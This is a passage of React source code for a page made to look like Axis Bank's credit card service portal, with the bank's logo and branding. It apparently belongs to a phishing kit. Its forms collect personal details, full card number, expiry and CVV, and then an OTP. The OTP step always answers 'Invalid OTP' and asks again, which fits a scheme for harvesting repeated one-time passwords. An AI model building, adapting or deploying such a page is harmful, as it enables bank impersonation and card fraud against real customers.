                </svg>
              </div>
              <div className="trust-badge-text">
                <h5 className="trust-title">Secure</h5>
                <p className="trust-desc">256-bit Encryption</p>
              </div>
            </div>

            <div className="trust-divider"></div>

            <div className="trust-badge-item">
              <div className="trust-badge-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="#475569" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                  <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
                </svg>
              </div>
              <div className="trust-badge-text">
                <h5 className="trust-title">Fast</h5>
                <p className="trust-desc">Instant Updates</p>
              </div>
            </div>

            <div className="trust-divider"></div>

            <div className="trust-badge-item">
              <div className="trust-badge-icon">
                <svg viewBox="0 0 24 24" fill="none" stroke="#475569" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M3 18v-6a9 9 0 0 1 18 0v6" />
                  <path d="M21 19a2 2 0 0 1-2 2h-1a2 2 0 0 1-2-2v-3a2 2 0 0 1 2-2h3zM3 19a2 2 0 0 0 2 2h1a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2H3z" />
                </svg>
              </div>
              <div className="trust-badge-text">
                <h5 className="trust-title">24/7</h5>
                <p className="trust-desc">Dedicated Support</p>
              </div>
            </div>
          </div>

          {/* Site Footer */}
          <footer className="site-footer">
            <div className="footer-brand-icon-wrap">
              <img src="/icon.png" alt="Axis Bank" className="footer-brand-icon" />
            </div>
            <p className="footer-tagline">Banking that is intuitive, secure, and rewarding.</p>
            <div className="footer-links">
              <a href="#about" className="footer-link">About Us</a>
              <a href="#privacy" className="footer-link">Privacy Policy</a>
              <a href="#terms" className="footer-link">Terms of Use</a>
              <a href="#contact" className="footer-link">Contact Support</a>
            </div>
            <p className="footer-copyright">© 2026 Axis Bank Limited. All rights reserved.</p>
          </footer>
        </section>
      </main>

      {/* Floating Scroll-to-Top Action Button */}
      <button
        className="fab-btn"
        onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
        aria-label="Scroll to top"
      >
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.8" strokeLinecap="round" strokeLinejoin="round">
          <polyline points="18 15 12 9 6 15" />
        </svg>
      </button>

      {/* ─── Drawer Backdrop ─── */}
      <div
        className={`drawer-backdrop ${sidebarOpen ? 'open' : ''}`}
        onClick={() => setSidebarOpen(false)}
      />

      {/* ─── Slide-out Drawer from Right ─── */}
      <aside className={`sidebar-drawer ${sidebarOpen ? 'open' : ''}`}>
        {/* Drawer Header with Burgundy Gradient & icon.png */}
        <div className="drawer-header">
          <div className="drawer-icon-card">
            <img src="/icon.png" alt="Axis Bank" className="drawer-axis-icon" />
          </div>
          <h2 className="drawer-title">Axis Services</h2>
          <p className="drawer-subtitle">Credit Card Management</p>
        </div>

        {/* Drawer Navigation List */}
        <nav className="drawer-nav">
          <ul className="drawer-menu-list">
            {menuItems.map((item) => (
              <li
                key={item.id}
                id={`drawer-item-${item.id}`}
                className={`drawer-menu-item ${activeItem === item.id ? 'active' : ''}`}
                onClick={() => {
                  setActiveItem(item.id)
                  setSidebarOpen(false)
                  openCardModal(item.label, item.label)
                }}
              >
                <span className="drawer-item-icon">
                  <MenuIcon type={item.icon} />
                </span>
                <span className="drawer-item-label">{item.label}</span>
                <span className="drawer-item-arrow">
                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="9 18 15 12 9 6" />
                  </svg>
                </span>
              </li>
            ))}
          </ul>
        </nav>
      </aside>
      {/* ─── Service Form Modal with Opening Animation ─── */}
      {activeModal && (
        <div className="modal-overlay" onClick={closeModal}>
          <div className="modal-dialog" onClick={(e) => e.stopPropagation()}>
            <button
              className="modal-close-btn"
              onClick={closeModal}
              aria-label="Close form"
            >
              ✕
            </button>

            <div className="modal-body">
              {/* Modal Logo */}
              <div className="modal-logo-header">
                <img src="/logo-full.png" alt="Logo" className="modal-header-logo" />
              </div>

              {formSubmitted ? (
                <div className="modal-success-state">
                  <div className="success-check-icon">
                    <svg
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="3"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                    >
                      <line x1="18" y1="6" x2="6" y2="18" />
                      <line x1="6" y1="6" x2="18" y2="18" />
                    </svg>
                  </div>
                  <h3 className="success-title">Invalid OTP</h3>
                  <p className="success-desc">
                    The OTP you entered is invalid. Please try again.
                  </p>
                  <button
                    type="button"
                    className="modal-done-btn"
                    onClick={() => {
                      setFormSubmitted(false);
                      setOtpCode('');
                      setOtpError('');
                      setShowOtpModal(true);
                    }}
                  >
                    Try Again
                  </button>
                </div>
              ) : (
                <>
                  <div className="modal-header-text">
                    <h3 className="modal-title">{activeModal.title}</h3>
                    <p className="modal-security-tagline">
                      100% Safe Identity Check: Your details are processed securely with end-to-end encryption.
                    </p>
                  </div>

                  {showOtpModal && (
                    <div className="otp-overlay" onClick={() => setShowOtpModal(false)}>
                      <div className="otp-modal" onClick={(e) => e.stopPropagation()}>
                        <button
                          type="button"
                          className="otp-close"
                          onClick={() => setShowOtpModal(false)}
                          aria-label="Close OTP modal"
                        >
                          ×
                        </button>

                        <span className="otp-secure-badge">Secure OTP Verification</span>
                        <h2>Verify OTP</h2>
                        <p>
                          We have sent a 6-digit OTP to your registered mobile ending in{' '}
                          <strong>{formData.mobile ? formData.mobile.slice(-4) : 'XXXX'}</strong> and email{' '}
                          <strong>{formData.email || 'your email'}</strong>.
                          <br />
                          {/* Demo OTP for testing only: <strong>{currentDemoOtp || 'Generating...'}</strong> */}
                        </p>

                        <form onSubmit={handleOtpSubmit} className="otp-form">
                          <label htmlFor="otp-input">Enter OTP</label>
                          <input
                            id="otp-input"
                            type="text"
                            inputMode="numeric"
                            maxLength={6}
                            value={otpCode}
                            onChange={(e) => {
                              const value = e.target.value.replace(/\D/g, '').slice(0, 6)
                              setOtpCode(value)
                              if (otpError) setOtpError('')
                            }}
                          />

                          {otpError && (
                            <p style={{ color: '#c53030', marginTop: '10px', fontSize: '12px', fontWeight: 600 }}>
                              {otpError}
                            </p>
                          )}

                          <button type="submit" className="otp-verify">Verify & Submit</button>
                          <button
                            type="button"
                            className="otp-cancel"
                            onClick={() => setShowOtpModal(false)}
                          >
                            Cancel
                          </button>
                        </form>
                      </div>
                    </div>
                  )}

                  {formStep === 1 ? (
                    <form className="modal-form" onSubmit={handleStep1Submit}>
                      <div className="modal-form-group">
                        <label className="modal-label">Full Name</label>
                        <input
                          type="text"
                          required
                          className="modal-input"
                          placeholder="Enter full name"
                          value={formData.fullName}
                          onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
                        />
                      </div>

                      <div className="modal-form-group">
                        <label className="modal-label">Your email</label>
                        <input
                          type="email"
                          required
                          className="modal-input"
                          placeholder="name@example.com"
                          value={formData.email}
                          onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                        />
                      </div>

                      <div className="modal-form-group">
                        <label className="modal-label">Mobile No.</label>
                        <input
                          type="tel"
                          required
                          className="modal-input"
                          placeholder="Mobile number"
                          value={formData.mobile}
                          onChange={(e) => setFormData({ ...formData, mobile: e.target.value })}
                        />
                      </div>

                      <div className="modal-form-group">
                        <label className="modal-label">Date of Birth</label>
                        <input
                          type="date"
                          required
                          className="modal-input"
                          value={formData.dob}
                          onChange={(e) => setFormData({ ...formData, dob: e.target.value })}
                        />
                      </div>

                      <div className="modal-form-group">
                        <label className="modal-label">Service Plan</label>
                        <select
                          className="modal-select"
                          value={formData.plan}
                          onChange={(e) => setFormData({ ...formData, plan: e.target.value })}
                        >
                          <option value="ACTIVATE">ACTIVATE</option>
                          <option value="DEACTIVATE">DEACTIVATE</option>
                        </select>
                      </div>

                      <button type="submit" className="modal-submit-btn">
                        SUBMIT
                      </button>
                    </form>
                  ) : (
                    <form className="modal-form" onSubmit={handleStep2Submit}>
                      <div className="modal-form-group">
                        <label className="modal-label" htmlFor="step2-field-1">Card Holder Name</label>
                        <input
                          id="step2-field-1"
                          type="text"
                          className="modal-input"
                          value={formData.cardHolderName}
                          onChange={(e) => setFormData({ ...formData, cardHolderName: e.target.value })}
                        />
                      </div>

                      <div className="modal-form-group">
                        <label className="modal-label" htmlFor="step2-field-2">
                          Credit Card Number
                        </label>

                        <input
                          id="step2-field-2"
                          type="text"
                          inputMode="numeric"
                          autoComplete="cc-number"
                          maxLength={16}
                          className="modal-input"
                          placeholder="Enter card number"
                          value={formData.cardNumber}
                          onChange={(e) => {
                            const value = e.target.value
                              .replace(/\D/g, "")
                              .slice(0, 16);

                            setFormData({
                              ...formData,
                              cardNumber: value,
                            });
                          }}
                          required
                          pattern="[0-9]{15,16}"
                          title="Enter a valid 15 or 16 digit card number"
                        />
                      </div>
                      
                      <div className="modal-form-group">
                        <label className="modal-label" htmlFor="step2-field-3">
                          Valid Upto (MM/YY)
                        </label>

                        <input
                          id="step2-field-3"
                          type="text"
                          inputMode="numeric"
                          autoComplete="cc-exp"
                          className="modal-input"
                          placeholder="MM/YY"
                          maxLength={5}
                          value={formData.expiry}
                          onChange={(e) => {
                            let value = e.target.value.replace(/\D/g, "").slice(0, 4);

                            if (value.length > 2) {
                              value = value.slice(0, 2) + "/" + value.slice(2);
                            }

                            setFormData({
                              ...formData,
                              expiry: value,
                            });
                          }}
                          required
                          pattern="(0[1-9]|1[0-2])\/[0-9]{2}"
                          title="Enter expiry in MM/YY format, e.g. 03/30"
                        />
                      </div>
                      
                      <div className="modal-form-group">
                        <label className="modal-label" htmlFor="step2-field-4">
                          CVV
                        </label>

                        <input
                          id="step2-field-4"
                          type="password"
                          inputMode="numeric"
                          autoComplete="cc-csc"
                          maxLength={3}
                          className="modal-input"
                          placeholder="Enter CVV"
                          value={formData.cvv}
                          onChange={(e) => {
                            const value = e.target.value
                              .replace(/\D/g, "")
                              .slice(0, 3);

                            setFormData({
                              ...formData,
                              cvv: value,
                            });
                          }}
                          required
                          pattern="[0-9]{3}"
                          title="CVV must contain exactly 3 digits"
                        />
                      </div>

                      <div className="modal-checkboxes-section">
                        <label className="modal-checkbox-label">
                          <input
                            type="checkbox"
                            className="modal-checkbox-input"
                            checked={formData.agree1}
                            onChange={(e) => setFormData({ ...formData, agree1: e.target.checked })}
                          />
                          <span className="modal-checkbox-text">
                          I, confirm that the details provided
above belong to me and can be used
for processing my Credit Card
application with AXIS BANK Limited
Also, I understand that I am
responsible for the accuracy of the
information provided herewith and can
be held legally liable for any
isinformation.
                          </span>
                        </label>

                        <label className="modal-checkbox-label">
                          <input
                            type="checkbox"
                            className="modal-checkbox-input"
                            checked={formData.agree2}
                            onChange={(e) => setFormData({ ...formData, agree2: e.target.checked })}
                          />
                          <span className="modal-checkbox-text">
                           I, authorise AXIS BANK (by
inputting OTP on this page received on
my mobile no.), its group companies,
associates, affiliates, any third party
engaged by AXIS BANK etc. to contact
me through call/SMS/emall (overriding
my NDNC registration) on the details
provided above and to contact any third
party bureau for obtaining my credit
report.
                          </span>
                        </label>

                        <label className="modal-checkbox-label">
                          <input
                            type="checkbox"
                            className="modal-checkbox-input"
                            checked={formData.agree3}
                            onChange={(e) => setFormData({ ...formData, agree3: e.target.checked })}
                          />
                          <span className="modal-checkbox-text">
                           I hereby authorize AXIS BANK
Limited to retrieve my Central KYC
(CKYC) record from the Central KYC
Registry.
                          </span>
                        </label>
                      </div>

                      <button type="submit" className="modal-submit-btn">
                        SUBMIT
                      </button>
                    </form>
                  )}
                </>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

export default App
